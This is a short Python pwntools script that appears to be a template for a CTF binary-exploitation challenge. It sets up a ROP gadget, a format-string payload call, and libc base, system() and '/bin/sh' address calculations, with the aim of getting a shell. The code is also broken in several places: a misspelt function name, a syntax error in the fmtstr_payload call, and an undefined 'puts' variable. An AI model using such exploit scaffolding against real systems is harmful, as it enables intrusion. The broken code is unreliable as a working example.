from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
io=gdb.debug('./pwn')
#io=prosecc('./pwn')
#io=remote('',)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive
libc=ELF('./libc-2.31.so*')
elf=ELF('./pwn')

#system=libc.sym['system']

puts_got=elf.got['puts']
puts_addr=elf.sym['puts']

prdi=0x0000000000401783   #: pop rdi ; ret

#fmtstr_payload(,{addr:v}) 
fmtstr_payload(,{addr:v},numbwritten=0,write_size='short')# int short byte 







libc_base_addr=puts-libc.sym['puts']
system_addr=libc_base_addr+ libc.sym['system']    
bin_sh_addr=libc_base_addr+ next(libc.search(b'/bin/sh\x00'))




ii()
